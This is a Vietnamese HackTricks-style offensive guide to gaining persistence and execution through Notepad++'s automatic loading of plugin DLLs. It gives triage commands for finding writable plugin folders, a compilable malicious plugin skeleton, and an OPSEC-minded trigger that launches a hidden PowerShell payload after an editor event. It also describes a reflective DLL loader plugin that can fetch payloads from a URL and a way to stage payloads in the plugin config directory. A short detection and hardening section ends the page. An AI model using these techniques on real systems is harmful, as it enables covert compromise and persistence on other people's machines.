# Persistence & thực thi qua cơ chế tự động tải plugin của Notepad++

{{#include ../../banners/hacktricks-training.md}}

Notepad++ sẽ **tự động tải mọi plugin DLL trong các thư mục con `plugins`** khi khởi chạy. Đặt một plugin độc hại vào bất kỳ **thư mục cài đặt Notepad++ nào có quyền ghi** sẽ cho phép thực thi mã bên trong `notepad++.exe` mỗi khi trình soạn thảo khởi động. Điều này có thể bị lợi dụng để **persistence**, **thực thi ban đầu** một cách kín đáo hoặc làm **in-process loader** nếu trình soạn thảo được khởi chạy với quyền nâng cao.<sup>[[1]](#references)</sup>

Từ **Notepad++ 7.6 trở lên**, bố cục cài đặt thủ công được yêu cầu là **mỗi plugin có một thư mục con riêng** (`plugins\<PluginName>\<PluginName>.dll`). Trong **portable mode** (khi có `doLocalConf.xml` bên cạnh `notepad++.exe`), toàn bộ cây ứng dụng nằm trong thư mục đó, khiến các bộ công cụ quản trị được sao chép thường trở thành bề mặt thực thi dễ bị khai thác và có quyền ghi của người dùng.<sup>[[2]](#references)</sup>

## Các vị trí plugin có quyền ghi

- Bản cài đặt tiêu chuẩn: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (thường cần quyền admin để ghi).<sup>[[1]](#references)</sup>
- Các lựa chọn có quyền ghi dành cho người dùng ít đặc quyền:<sup>[[1]](#references)</sup>
  - Sử dụng **bản Notepad++ portable** trong thư mục người dùng có quyền ghi.
  - Sao chép `C:\Program Files\Notepad++` vào đường dẫn do người dùng kiểm soát (ví dụ: `%LOCALAPPDATA%\npp\`) rồi chạy `notepad++.exe` tại đó.
  - Tìm kiếm **các bộ công cụ quản trị**, bản sao được giải nén từ zip hoặc bộ công cụ hỗ trợ kỹ thuật đã có `doLocalConf.xml` và nằm ngoài `Program Files`.
- Mỗi plugin có thư mục con riêng bên dưới `plugins` và được tự động tải khi khởi động; các mục menu xuất hiện trong **Plugins**.<sup>[[2]](#references)</sup>

Phân loại nhanh:

```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```

## Các điểm tải plugin (primitive thực thi)
Notepad++ cần các **hàm được export** cụ thể. Tất cả đều được gọi trong quá trình khởi tạo, tạo ra nhiều bề mặt thực thi:<sup>[[1]](#references)</sup>
- **`DllMain`** — chạy ngay khi DLL được tải (điểm thực thi đầu tiên).
- **`setInfo(NppData)`** — được gọi một lần khi tải để cung cấp các handle của Notepad++; thường dùng để đăng ký các mục menu.
- **`getName()`** — trả về tên plugin hiển thị trong menu.
- **`getFuncsArray(int *nbF)`** — trả về các lệnh trong menu; ngay cả khi danh sách rỗng, hàm này vẫn được gọi khi khởi động.
- **`beNotified(SCNotification*)`** — nhận các sự kiện của Notepad++ / Scintilla (hữu ích để trì hoãn payload cho đến khi người dùng thao tác hoặc có sự kiện từ trình soạn thảo).
- **`messageProc(UINT, WPARAM, LPARAM)`** — trình xử lý thông điệp, hữu ích khi cần trao đổi lượng dữ liệu lớn hơn.
- **`isUnicode()`** — cờ tương thích được kiểm tra khi tải.

Hầu hết các hàm export có thể được triển khai dưới dạng **stub**; việc thực thi có thể diễn ra từ `DllMain` hoặc bất kỳ callback nào ở trên trong quá trình autoload.

## Bộ khung plugin độc hại tối giản
Biên dịch một DLL với các hàm export cần thiết và đặt nó tại `plugins\\MyNewPlugin\\MyNewPlugin.dll` bên trong thư mục Notepad++ có quyền ghi:<sup>[[1]](#references)</sup>

```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```

1. Build DLL (Visual Studio/MinGW).
2. Tạo thư mục con của plugin bên trong `plugins` rồi đặt DLL vào đó.
3. Khởi động lại Notepad++; DLL sẽ được tự động tải, thực thi `DllMain` và các callback tiếp theo.

## Mẫu kích hoạt ít gây chú ý qua `beNotified`
Vì OPSEC, nhiều payload không nên chạy từ `DllMain`. Một mẫu kín đáo hơn là để plugin tải bình thường, rồi chỉ thực thi sau một sự kiện biên tập thực tế, chẳng hạn như **hoàn tất khởi động**, **kích hoạt buffer** hoặc **ký tự đầu tiên được nhập**.

```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
  if (fired) return;
  if (n->nmhdr.code == NPPN_READY ||
      n->nmhdr.code == NPPN_BUFFERACTIVATED ||
      n->nmhdr.code == SCN_CHARADDED) {
    fired = true;
    WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
  }
}
```

Cách này phù hợp với nghiên cứu offensive công khai hơn một beacon `DllMain` dễ gây chú ý: DLL vẫn được tự động tải khi khởi động, nhưng hành động độc hại chỉ diễn ra sau khi Notepad++ thực sự được sử dụng.

## Dùng thư mục cấu hình plugin làm nơi lưu trữ phụ
Notepad++ cung cấp `NPPM_GETPLUGINSCONFIGDIR`, trả về **thư mục cấu hình plugin của người dùng hiện tại**.<sup>[[3]](#references)</sup> Plugin độc hại có thể dùng tính năng này để giữ DLL trên đĩa ở mức tối giản, đồng thời lưu cấu hình đã mã hóa, payload được chuẩn bị sẵn hoặc các tệp giao nhiệm vụ ở một đường dẫn trông giống dữ liệu plugin thông thường.

```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```

Về mặt vận hành, cách này hữu ích khi bạn muốn:
- một bootstrap DLL nhỏ được autoload;
- tasking theo từng người dùng mà không cần chỉnh sửa lại binary plugin chính;
- tách **autoload trigger** khỏi second stage nặng hơn.

## Mẫu reflective loader plugin
Một plugin được weaponize có thể biến Notepad++ thành **reflective DLL loader**:<sup>[[1]](#references)</sup>
- Hiển thị UI/mục menu tối giản (ví dụ: "LoadDLL").
- Chấp nhận **đường dẫn file** hoặc **URL** để tải payload DLL.
- Reflectively map DLL vào process hiện tại và gọi một entry point được export (ví dụ: một loader function bên trong DLL được tải về).
- Lợi ích: tận dụng một process GUI trông vô hại thay vì spawn loader mới; payload kế thừa integrity của `notepad++.exe` (bao gồm cả các context đã elevated).
- Đánh đổi: ghi một **plugin DLL chưa được ký** xuống đĩa sẽ gây chú ý; một biến thể thực tế là chỉ dùng plugin được autoload làm stub, còn implant thực sự được mã hóa/stage ở nơi khác.

## Ghi chú về phát hiện và hardening
- Chặn hoặc giám sát **các thao tác ghi vào thư mục plugin của Notepad++** (bao gồm các bản portable trong user profile); bật controlled folder access hoặc application allowlisting.
- Cảnh báo khi có **DLL chưa được ký mới** trong `plugins`, thay đổi trong cây thư mục Notepad++ portable, và **child process/hoạt động mạng bất thường** từ `notepad++.exe`.
- Lập baseline cho các plugin hợp lệ và điều tra mọi DLL mới export giao diện plugin Notepad++ thông thường nhưng cũng spawn shell, PowerShell hoặc network beacon.
- Chỉ cho phép cài plugin qua **Plugins Admin**, đồng thời hạn chế chạy các bản portable từ đường dẫn không đáng tin cậy.

## References

- [1] [TrustedSec - Plugin Notepad++: Cắm và Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Sổ tay người dùng Notepad++ - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Sổ tay người dùng Notepad++ - Giao tiếp Plugin](https://npp-user-manual.org/docs/plugin-communication/)
{{#include ../../banners/hacktricks-training.md}}
